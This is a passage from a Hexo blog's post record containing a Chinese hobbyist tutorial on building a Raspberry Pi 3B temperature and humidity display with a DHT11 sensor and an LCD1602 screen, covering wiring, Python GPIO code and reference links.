self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVERIGHT);\n\n\n    def leftToRight(self):\n        \"\"\" This is for text that flows Left to Right \"\"\"\n\n        self.displaymode |= self.LCD_ENTRYLEFT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode);\n\n\n    def rightToLeft(self):\n        \"\"\" This is for text that flows Right to Left \"\"\"\n        self.displaymode &= ~self.LCD_ENTRYLEFT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def autoscroll(self):\n        \"\"\" This will 'right justify' text from the cursor \"\"\"\n\n        self.displaymode |= self.LCD_ENTRYSHIFTINCREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def noAutoscroll(self): \n        \"\"\" This will 'left justify' text from the cursor \"\"\"\n\n        self.displaymode &= ~self.LCD_ENTRYSHIFTINCREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def write4bits(self, bits, char_mode=False):\n        \"\"\" Send command to LCD \"\"\"\n\n        self.delayMicroseconds(1000) # 1000 microsecond sleep\n\n        bits=bin(bits)[2:].zfill(8)\n\n        self.GPIO.output(self.pin_rs, char_mode)\n\n        for pin in self.pins_db:\n            self.GPIO.output(pin, False)\n\n        for i in range(4):\n            if bits[i] == \"1\":\n                self.GPIO.output(self.pins_db[::-1][i], True)\n\n        self.pulseEnable()\n\n        for pin in self.pins_db:\n            self.GPIO.output(pin, False)\n\n        for i in range(4,8):\n            if bits[i] == \"1\":\n                self.GPIO.output(self.pins_db[::-1][i-4], True)\n\n        self.pulseEnable()\n\n\n    def delayMicroseconds(self, microseconds):\n        seconds = microseconds / float(1000000) # divide microseconds by 1 million for seconds\n        sleep(seconds)\n\n\n    def pulseEnable(self):\n        self.GPIO.output(self.pin_e, False)\n        self.delayMicroseconds(1)               # 1 microsecond pause - enable pulse must be > 450ns \n        self.GPIO.output(self.pin_e, True)\n        self.delayMicroseconds(1)               # 1 microsecond pause - enable pulse must be > 450ns \n        self.GPIO.output(self.pin_e, False)\n        self.delayMicroseconds(1)               # commands need > 37us to settle\n\n\n    def message(self, text):\n        \"\"\" Send string to LCD. Newline wraps to second line\"\"\"\n\n        for char in text:\n            if char == '\\n':\n                self.write4bits(0xC0) # next line\n            else:\n                self.write4bits(ord(char),True)\n\nif __name__ == '__main__':\n\n    while True:\n        tmp = get_tmp() \n        if tmp:\n            lcd = Adafruit_CharLCD()\n            lcd.noBlink()\n            lcd.clear()\n            lcd.message(tmp)\n        sleep(5)\n\n```\n# 运行效果\n![](/content/images/2016/08/WechatIMG302.jpeg)\n\n\n![](/content/images/2016/08/WechatIMG293.jpeg)\n# 参考资料\nhttps://gist.github.com/hugozhu/6166527\nhttps://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f\nhttps://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py\nhttp://blog.csdn.net/xukai871105/article/details/12684617\nhttps://www.oschina.net/question/1425530\\_140979\nhttp://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html\nhttp://blog.csdn.net/netccy/article/details/48098455\nhttps://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html\nhttp://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html\nhttp://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html\nhttp://blog.csdn.net/rocklee/article/details/50082777\nhttp://www.guokr.com/post/718305/\nhttp://www.rs-online.com/designspark/electronics/blog/content-1148\nhttp://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html\nhttps://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml\nhttp://blog.csdn.net/u013431550/article/details/40870947\nhttp://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba\nhttp://blog.csdn.net/longerzone/article/details/36171381","source":"_posts/基于树莓派的实时温度湿度监测平台.md","raw":"---\ntitle: 基于树莓派的实时温度湿度监测平台\ntags: 'Raspberry'\npermalink: rpi-tmp-hdt-platform\nid: 15\nupdated: '2016-08-25 19:28:59'\ndate: 2016-08-25 13:39:08\n---\n\n\n# 前言\n很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。\n\n在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。\n<!-- more --> \n# 知识储备\n* 数字电子技术基础\n* 微机原理与接口技术\n* python语言\n\n# 原料\n* 树莓派3B\n* DHT11\n* LCD1602\n* 2K电阻（也可以是电位器）\n* 子-母 和 母-母 杜邦线\n* 电气绝缘胶带\n* 剪刀\n* 一颗耐心和一颗细心\n\n# 语言\n* Python 2.7\n\n# 组件\n* python-dev\n* python-rpi.gpio\n如果不具备以上，请执行：\n```bash\nsudo apt-get update\nsudo apt-get install python-dev\nsudo apt-get install python-rpi.gpio\n```\n\n# 接线\n我们一共要完成两个任务：\n\n* 1.连接LCD1602\n* 2.连接DHT11\n\n树莓派3B的GPIO图如下：\n\n![](/content/images/2016/08/GPIO.png)\n##  2K 电阻如何连接到电路\n简单粗暴的方法就是把电阻两头连接到两个子-母杜邦线上，然后用绝缘胶布缠上，非常方便美观。\n\n## LCD1602 接线方案\n\nLCD 与 树莓派相连 方案图，2K电阻是我自行设计，如果有电位器最好放置电位器：\n![](/content/images/2016/08/LCD1602--.jpg)\n\n树莓派的USB端口朝下，电源线位置朝上方向摆放。\n右端一共有40个引脚，每个引脚的PIN位置如上。\n\nVSS，接地，RPi PIN 6\nVDD，接5V电源，PRi PIN 2\nVO，液晶对比度调节，接1K 电阻，另一端相连接地，PIN 9\nRS，寄存器选择，接GPIO 14，RPi PIN 8\nRW，读写选择，接地，表示写模式，PRi PIN 6\nE，使能信号，接GPIO 15，RPi PIN 10\nD0，数据位0，4位工作模式下不用，不接\nD1，数据位1，4位工作模式下不用，不接\nD2，数据位2，4位工作模式下不用，不接\nD3，数据位3，4位工作模式下不用，不接\nD4，数据位4，接GPIO 17，RPi PIN 11\nD5，数据位5，接GPIO 18，RPi PIN 12\nD6，数据位6，接GPIO 27，RPi PIN 13\nD7，数据位7，接GPIO 22，RPi PIN 15\nA，液晶屏背光+，接5V，RPi PIN 4\nK，液晶屏背光-，接地，RPi PIN 39\n\n**连接好后，务必要仔细检查是否连接正确，以防开机烧坏GPIO甚至树莓派。**\n\n建议在关机情况下接线，如果在开机情况下接线，VDD请最后连接。\n\n## LCD1602 开机测试\n接通电源线，默认情况下，如果连接正确：\n\n* 肯定没有爆炸\n* 会出现如下图的效果，证明你已经接线成功了\n![](/content/images/2016/08/1.jpg)\n\n## DHT11 接线方案\n接线简单，主要是把数据传输到GPIO26上\n\nDHT11有3个脚，VCC，DATA，GND\nVCC 接 3.3V PIN 01\nDATA 接 GPIO26 PIN 37\nGND 接地  PIN 09\n\n#代码\n采用python语言编写，由于html对tab和空格的支持不好，复制容易产生编译问题，代码已经传到github\n\nhttps://github.com/yfgeek/rpi-TmpHmdRuntime\n```python\n#!/usr/bin/python\n\n# based on code from hugozhu/CharLCD.py https://gist.github.com/hugozhu/6166527\n# rewrite by ivan\n\nfrom time import sleep\nfrom datetime import datetime\nfrom time import sleep\nimport commands,time\nimport RPi.GPIO as GPIO\n\ndef get_tmp():\n  channel = 37\n  data = []\n  j = 0\n\n  GPIO.setmode(GPIO.BOARD)\n\n  time.sleep(1)\n\n  GPIO.setup(channel, GPIO.OUT)\n  GPIO.output(channel, GPIO.LOW)\n  time.sleep(0.5)\n  GPIO.output(channel, GPIO.HIGH)\n  GPIO.setup(channel, GPIO.IN)\n\n  while GPIO.input(channel) == GPIO.LOW:\n    continue\n  while GPIO.input(channel) == GPIO.HIGH:\n    continue\n\n  while j < 40:\n    k = 0\n    while GPIO.input(channel) == GPIO.LOW:\n      continue\n    while GPIO.input(channel) == GPIO.HIGH:\n      k += 1\n      if k > 100:\n        break\n    if k < 8:\n      data.append(0)\n    else:\n      data.append(1)\n\n    j += 1\n\n  print \"sensor is working.\"\n  print data\n\n  humidity_bit = data[0:8]\n  humidity_point_bit = data[8:16]\n  temperature_bit = data[16:24]\n  temperature_point_bit = data[24:32]\n  check_bit = data[32:40]\n\n  humidity = 0\n  humidity_point = 0\n  temperature = 0\n  temperature_point = 0\n  check = 0\n\n  for i in range(8):\n    humidity += humidity_bit[i] * 2 ** (7-i)\n    humidity_point += humidity_point_bit[i] * 2 ** (7-i)\n    temperature += temperature_bit[i] * 2 ** (7-i)\n    temperature_point += temperature_point_bit[i] * 2 ** (7-i)\n    check += check_bit[i] * 2 ** (7-i)\n\n  tmp = humidity + humidity_point + temperature + temperature_point\n\n  if check == tmp:\n    return 'temp:' + str(temperature) + ' C \\nhumidity:' + str(humidity) + '%'\n  else:\n    get_tmp()\n\n  GPIO.cleanup()    \n\nclass Adafruit_CharLCD:\n\n    # commands\n    LCD_CLEARDISPLAY            = 0x01\n    LCD_RETURNHOME                  = 0x02\n    LCD_ENTRYMODESET            = 0x04\n    LCD_DISPLAYCONTROL          = 0x08\n    LCD_CURSORSHIFT             = 0x10\n    LCD_FUNCTIONSET             = 0x20\n    LCD_SETCGRAMADDR            = 0x40\n    LCD_SETDDRAMADDR            = 0x80\n\n    # flags for display entry mode\n    LCD_ENTRYRIGHT              = 0x00\n    LCD_ENTRYLEFT               = 0x02\n    LCD_ENTRYSHIFTINCREMENT     = 0x01\n    LCD_ENTRYSHIFTDECREMENT     = 0x00\n\n    # flags for display on/off control\n    LCD_DISPLAYON               = 0x04\n    LCD_DISPLAYOFF              = 0x00\n    LCD_CURSORON                = 0x02\n    LCD_CURSOROFF               = 0x00\n    LCD_BLINKON                 = 0x01\n    LCD_BLINKOFF                = 0x00\n\n    # flags for display/cursor shift\n    LCD_DISPLAYMOVE             = 0x08\n    LCD_CURSORMOVE              = 0x00\n\n    # flags for display/cursor shift\n    LCD_DISPLAYMOVE             = 0x08\n    LCD_CURSORMOVE              = 0x00\n    LCD_MOVERIGHT               = 0x04\n    LCD_MOVELEFT                = 0x00\n\n    # flags for function set\n    LCD_8BITMODE                = 0x10\n    LCD_4BITMODE                = 0x00\n    LCD_2LINE                   = 0x08\n    LCD_1LINE                   = 0x00\n    LCD_5x10DOTS                = 0x04\n    LCD_5x8DOTS                 = 0x00\n\n\n\n    def __init__(self, pin_rs=8, pin_e=10, pins_db=[11,12,13,15], GPIO = None):\n        # Emulate the old behavior of using RPi.GPIO if we haven't been given\n        # an explicit GPIO interface to use\n        if not GPIO:\n            import RPi.GPIO as GPIO\n        GPIO.setwarnings(False)\n\n        self.GPIO = GPIO\n        self.pin_rs = pin_rs\n        self.pin_e = pin_e\n        self.pins_db = pins_db\n\n        self.GPIO.setmode(GPIO.BOARD)\n        self.GPIO.setup(self.pin_e, GPIO.OUT)\n        self.GPIO.setup(self.pin_rs, GPIO.OUT)\n\n        for pin in self.pins_db:\n            self.GPIO.setup(pin, GPIO.OUT)\n\n        self.write4bits(0x33) # initialization\n        self.write4bits(0x32) # initialization\n        self.write4bits(0x28) # 2 line 5x7 matrix\n        self.write4bits(0x0C) # turn cursor off 0x0E to enable cursor\n        self.write4bits(0x06) # shift cursor right\n\n        self.displaycontrol = self.LCD_DISPLAYON | self.LCD_CURSOROFF | self.LCD_BLINKOFF\n\n        self.displayfunction = self.LCD_4BITMODE | self.LCD_1LINE | self.LCD_5x8DOTS\n        self.displayfunction |= self.LCD_2LINE\n\n        \"\"\" Initialize to default text direction (for romance languages) \"\"\"\n        self.displaymode =  self.LCD_ENTRYLEFT | self.LCD_ENTRYSHIFTDECREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) #  set the entry mode\n\n        self.clear()\n\n\n    def begin(self, cols, lines):\n\n        if (lines > 1):\n                self.numlines = lines\n                self.displayfunction |= self.LCD_2LINE\n                self.currline = 0\n\n\n    def home(self):\n\n        self.write4bits(self.LCD_RETURNHOME) # set cursor position to zero\n        self.delayMicroseconds(3000) # this command takes a long time!\n\n\n    def clear(self):\n\n        self.write4bits(self.LCD_CLEARDISPLAY) # command to clear display\n        self.delayMicroseconds(3000)    # 3000 microsecond sleep, clearing the display takes a long time\n\n\n    def setCursor(self, col, row):\n\n        self.row_offsets = [ 0x00, 0x40, 0x14, 0x54 ]\n\n        if ( row > self.numlines ): \n                row = self.numlines - 1 # we count rows starting w/0\n\n        self.write4bits(self.LCD_SETDDRAMADDR | (col + self.row_offsets[row]))\n\n\n    def noDisplay(self): \n        \"\"\" Turn the display off (quickly) \"\"\"\n\n        self.displaycontrol &= ~self.LCD_DISPLAYON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def display(self):\n        \"\"\" Turn the display on (quickly) \"\"\"\n\n        self.displaycontrol |= self.LCD_DISPLAYON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noCursor(self):\n        \"\"\" Turns the underline cursor on/off \"\"\"\n\n        self.displaycontrol &= ~self.LCD_CURSORON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def cursor(self):\n        \"\"\" Cursor On \"\"\"\n\n        self.displaycontrol |= self.LCD_CURSORON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noBlink(self):\n        \"\"\" Turn on and off the blinking cursor \"\"\"\n\n        self.displaycontrol &= ~self.LCD_BLINKON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noBlink(self):\n        \"\"\" Turn on and off the blinking cursor \"\"\"\n\n        self.displaycontrol &= ~self.LCD_BLINKON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def DisplayLeft(self):\n        \"\"\" These commands scroll the display without changing the RAM \"\"\"\n\n        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVELEFT)\n\n\n    def scrollDisplayRight(self):\n        \"\"\" These commands scroll the display without changing the RAM \"\"\"\n\n        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVERIGHT);\n\n\n    def leftToRight(self):\n        \"\"\" This is for text that flows Left to Right \"\"\"\n\n        self.displaymode |= self.LCD_ENTRYLEFT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode);\n\n\n    def rightToLeft(self):\n        \"\"\" This is for text that flows Right to Left \"\"\"\n        self.displaymode &= ~self.LCD_ENTRYLEFT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def autoscroll(self):\n        \"\"\" This will 'right justify' text from the cursor \"\"\"\n\n        self.displaymode |= self.LCD_ENTRYSHIFTINCREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def noAutoscroll(self): \n        \"\"\" This will 'left justify' text from the cursor \"\"\"\n\n        self.displaymode &= ~self.LCD_ENTRYSHIFTINCREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def write4bits(self, bits, char_mode=False):\n        \"\"\" Send command to LCD \"\"\"\n\n        self.delayMicroseconds(1000) # 1000 microsecond sleep\n\n        bits=bin(bits)[2:].zfill(8)\n\n        self.GPIO.output(self.pin_rs, char_mode)\n\n        for pin in self.pins_db:\n            self.GPIO.output(pin, False)\n\n        for i in range(4):\n            if bits[i] == \"1\":\n                self.GPIO.output(self.pins_db[::-1][i], True)\n\n        self.pulseEnable()\n\n        for pin in self.pins_db:\n            self.GPIO.output(pin, False)\n\n        for i in range(4,8):\n            if bits[i] == \"1\":\n                self.GPIO.output(self.pins_db[::-1][i-4], True)\n\n        self.pulseEnable()\n\n\n    def delayMicroseconds(self, microseconds):\n        seconds = microseconds / float(1000000) # divide microseconds by 1 million for seconds\n        sleep(seconds)\n\n\n    def pulseEnable(self):\n        self.GPIO.output(self.pin_e, False)\n        self.delayMicroseconds(1)               # 1 microsecond pause - enable pulse must be > 450ns \n        self.GPIO.output(self.pin_e, True)\n        self.delayMicroseconds(1)               # 1 microsecond pause - enable pulse must be > 450ns \n        self.GPIO.output(self.pin_e, False)\n        self.delayMicroseconds(1)               # commands need > 37us to settle\n\n\n    def message(self, text):\n        \"\"\" Send string to LCD. Newline wraps to second line\"\"\"\n\n        for char in text:\n            if char == '\\n':\n                self.write4bits(0xC0) # next line\n            else:\n                self.write4bits(ord(char),True)\n\nif __name__ == '__main__':\n\n    while True:\n        tmp = get_tmp() \n        if tmp:\n            lcd = Adafruit_CharLCD()\n            lcd.noBlink()\n            lcd.clear()\n            lcd.message(tmp)\n        sleep(5)\n\n```\n# 运行效果\n![](/content/images/2016/08/WechatIMG302.jpeg)\n\n\n![](/content/images/2016/08/WechatIMG293.jpeg)\n# 参考资料\nhttps://gist.github.com/hugozhu/6166527\nhttps://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f\nhttps://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py\nhttp://blog.csdn.net/xukai871105/article/details/12684617\nhttps://www.oschina.net/question/1425530\\_140979\nhttp://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html\nhttp://blog.csdn.net/netccy/article/details/48098455\nhttps://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html\nhttp://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html\nhttp://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html\nhttp://blog.csdn.net/rocklee/article/details/50082777\nhttp://www.guokr.com/post/718305/\nhttp://www.rs-online.com/designspark/electronics/blog/content-1148\nhttp://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html\nhttps://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml\nhttp://blog.csdn.net/u013431550/article/details/40870947\nhttp://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba\nhttp://blog.csdn.net/longerzone/article/details/36171381","slug":"rpi-tmp-hdt-platform","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xoy002l5es56f2esujn","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。</p>\n<p>在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。<br><a id=\"more\"></a> </p>\n<h1 id=\"知识储备\"><a href=\"#知识储备\" class=\"headerlink\" title=\"知识储备\"></a>知识储备</h1><ul>\n<li>数字电子技术基础</li>\n<li>微机原理与接口技术</li>\n<li>python语言</li>\n</ul>\n<h1 id=\"原料\"><a href=\"#原料\" class=\"headerlink\" title=\"原料\"></a>原料</h1><ul>\n<li>树莓派3B</li>\n<li>DHT11</li>\n<li>LCD1602</li>\n<li>2K电阻（也可以是电位器）</li>\n<li>子-母 和 母-母 杜邦线</li>\n<li>电气绝缘胶带</li>\n<li>剪刀</li>\n<li>一颗耐心和一颗细心</li>\n</ul>\n<h1 id=\"语言\"><a href=\"#语言\" class=\"headerlink\" title=\"语言\"></a>语言</h1><ul>\n<li>Python 2.7</li>\n</ul>\n<h1 id=\"组件\"><a href=\"#组件\" class=\"headerlink\" title=\"组件\"></a>组件</h1><ul>\n<li>python-dev</li>\n<li>python-rpi.gpio<br>如果不具备以上，请执行：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install python-dev</div><div class=\"line\">sudo apt-get install python-rpi.gpio</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<h1 id=\"接线\"><a href=\"#接线\" class=\"headerlink\" title=\"接线\"></a>接线</h1><p>我们一共要完成两个任务：</p>\n<ul>\n<li>1.连接LCD1602</li>\n<li>2.连接DHT11</li>\n</ul>\n<p>树莓派3B的GPIO图如下：</p>\n<p><img src=\"/content/images/2016/08/GPIO.png\" alt=\"\"></p>\n<h2 id=\"2K-电阻如何连接到电路\"><a href=\"#2K-电阻如何连接到电路\" class=\"headerlink\" title=\"2K 电阻如何连接到电路\"></a>2K 电阻如何连接到电路</h2><p>简单粗暴的方法就是把电阻两头连接到两个子-母杜邦线上，然后用绝缘胶布缠上，非常方便美观。</p>\n<h2 id=\"LCD1602-接线方案\"><a href=\"#LCD1602-接线方案\" class=\"headerlink\" title=\"LCD1602 接线方案\"></a>LCD1602 接线方案</h2><p>LCD 与 树莓派相连 方案图，2K电阻是我自行设计，如果有电位器最好放置电位器：<br><img src=\"/content/images/2016/08/LCD1602--.jpg\" alt=\"\"></p>\n<p>树莓派的USB端口朝下，电源线位置朝上方向摆放。<br>右端一共有40个引脚，每个引脚的PIN位置如上。</p>\n<p>VSS，接地，RPi PIN 6<br>VDD，接5V电源，PRi PIN 2<br>VO，液晶对比度调节，接1K 电阻，另一端相连接地，PIN 9<br>RS，寄存器选择，接GPIO 14，RPi PIN 8<br>RW，读写选择，接地，表示写模式，PRi PIN 6<br>E，使能信号，接GPIO 15，RPi PIN 10<br>D0，数据位0，4位工作模式下不用，不接<br>D1，数据位1，4位工作模式下不用，不接<br>D2，数据位2，4位工作模式下不用，不接<br>D3，数据位3，4位工作模式下不用，不接<br>D4，数据位4，接GPIO 17，RPi PIN 11<br>D5，数据位5，接GPIO 18，RPi PIN 12<br>D6，数据位6，接GPIO 27，RPi PIN 13<br>D7，数据位7，接GPIO 22，RPi PIN 15<br>A，液晶屏背光+，接5V，RPi PIN 4<br>K，液晶屏背光-，接地，RPi PIN 39</p>\n<p><strong>连接好后，务必要仔细检查是否连接正确，以防开机烧坏GPIO甚至树莓派。</strong></p>\n<p>建议在关机情况下接线，如果在开机情况下接线，VDD请最后连接。</p>\n<h2 id=\"LCD1602-开机测试\"><a href=\"#LCD1602-开机测试\" class=\"headerlink\" title=\"LCD1602 开机测试\"></a>LCD1602 开机测试</h2><p>接通电源线，默认情况下，如果连接正确：</p>\n<ul>\n<li>肯定没有爆炸</li>\n<li>会出现如下图的效果，证明你已经接线成功了<br><img src=\"/content/images/2016/08/1.jpg\" alt=\"\"></li>\n</ul>\n<h2 id=\"DHT11-接线方案\"><a href=\"#DHT11-接线方案\" class=\"headerlink\" title=\"DHT11 接线方案\"></a>DHT11 接线方案</h2><p>接线简单，主要是把数据传输到GPIO26上</p>\n<p>DHT11有3个脚，VCC，DATA，GND<br>VCC 接 3.3V PIN 01<br>DATA 接 GPIO26 PIN 37<br>GND 接地  PIN 09</p>\n<p>#代码<br>采用python语言编写，由于html对tab和空格的支持不好，复制容易产生编译问题，代码已经传到github</p>\n<p><a href=\"https://github.com/yfgeek/rpi-TmpHmdRuntime\" target=\"_blank\" rel=\"external\">https://github.com/yfgeek/rpi-TmpHmdRuntime</a><br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div><div class=\"line\">202</div><div class=\"line\">203</div><div class=\"line\">204</div><div class=\"line\">205</div><div class=\"line\">206</div><div class=\"line\">207</div><div class=\"line\">208</div><div class=\"line\">209</div><div class=\"line\">210</div><div class=\"line\">211</div><div class=\"line\">212</div><div class=\"line\">213</div><div class=\"line\">214</div><div class=\"line\">215</div><div class=\"line\">216</div><div class=\"line\">217</div><div class=\"line\">218</div><div class=\"line\">219</div><div class=\"line\">220</div><div class=\"line\">221</div><div class=\"line\">222</div><div class=\"line\">223</div><div class=\"line\">224</div><div class=\"line\">225</div><div class=\"line\">226</div><div class=\"line\">227</div><div class=\"line\">228</div><div class=\"line\">229</div><div class=\"line\">230</div><div class=\"line\">231</div><div class=\"line\">232</div><div class=\"line\">233</div><div class=\"line\">234</div><div class=\"line\">235</div><div class=\"line\">236</div><div class=\"line\">237</div><div class=\"line\">238</div><div class=\"line\">239</div><div class=\"line\">240</div><div class=\"line\">241</div><div class=\"line\">242</div><div class=\"line\">243</div><div class=\"line\">244</div><div class=\"line\">245</div><div class=\"line\">246</div><div class=\"line\">247</div><div class=\"line\">248</div><div class=\"line\">249</div><div class=\"line\">250</div><div class=\"line\">251</div><div class=\"line\">252</div><div class=\"line\">253</div><div class=\"line\">254</div><div class=\"line\">255</div><div class=\"line\">256</div><div class=\"line\">257</div><div class=\"line\">258</div><div class=\"line\">259</div><div class=\"line\">260</div><div class=\"line\">261</div><div class=\"line\">262</div><div class=\"line\">263</div><div 